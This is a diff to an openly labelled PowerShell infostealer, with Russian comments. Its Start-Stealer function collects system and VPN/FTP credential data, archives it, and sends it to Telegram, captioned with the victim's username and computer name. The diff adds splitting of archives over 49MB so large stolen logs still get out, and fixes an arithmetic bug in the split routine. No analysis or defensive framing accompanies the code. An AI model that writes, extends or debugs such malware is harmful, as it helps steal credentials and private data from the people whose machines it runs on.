@@ -102,11 +102,25 @@ function Start-Stealer {
             Write-Host $OutputMessages.VpnFtp -ForegroundColor Cyan
             Get-VpnFtpData -LogPath "$LogFolder\VpnFtp"
         }
+
         $ZipPath = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
         Write-Host $OutputMessages.Archiving -ForegroundColor Yellow
         Compress-Archive -Path "$LogFolder\*" -DestinationPath $ZipPath -Force
+
         Write-Host $OutputMessages.Sending -ForegroundColor Yellow
-        Send-TelegramFile -FilePath $ZipPath -Caption "New Log from $($env:USERNAME) on $($env:COMPUTERNAME)"
+        $MaxPartSize = 49MB
+        $size = (Get-Item $ZipPath).Length
+        if ($size -ge $MaxPartSize) {
+            $parts = Split-File -FilePath $ZipPath -MaxBytes $MaxPartSize
+            $i = 1
+            foreach ($partFile in $parts) {
+                Send-TelegramFile -FilePath $partFile -Caption "Log part $i ($partFile) from $($env:USERNAME) on $($env:COMPUTERNAME)"
+                Remove-Item $partFile -Force -ErrorAction SilentlyContinue
+                $i++
+            }
+        } else {
+            Send-TelegramFile -FilePath $ZipPath -Caption "New Log from $($env:USERNAME) on $($env:COMPUTERNAME)"
+        }
     }
     catch {
         Write-Host "Произошла ошибка: $($_.Exception.Message)" -ForegroundColor Red
@@ -124,6 +138,7 @@ function Start-Stealer {
         Write-Host $OutputMessages.Complete -ForegroundColor Green
     }
 }
+
 
 # --- Функции сбора данных ---
 function Get-SystemInformation {
@@ -431,7 +446,7 @@ function Split-File {
             $partStream = [System.IO.File]::Create($target)
             $written = 0
             while (($written -lt $MaxBytes) -and ($fs.Position -lt $fs.Length)) {
-                $toRead = [Math]::Min($buffsize, $MaxBytes - $written, $fs.Length - $fs.Position)
+                $toRead = [Math]::Min([Math]::Min($buffsize, ($MaxBytes - $written)), ($fs.Length - $fs.Position))
                 $buffer = New-Object byte[] $toRead
                 $read = $fs.Read($buffer, 0, $toRead)
                 if ($read -gt 0) { $partStream.Write($buffer, 0, $read); $written += $read }
@@ -444,6 +459,8 @@ function Split-File {
     } finally { $fs.Close() }
     return $files
 }
+
+
 
 # --- Запуск основной функции ---
 Start-Stealer
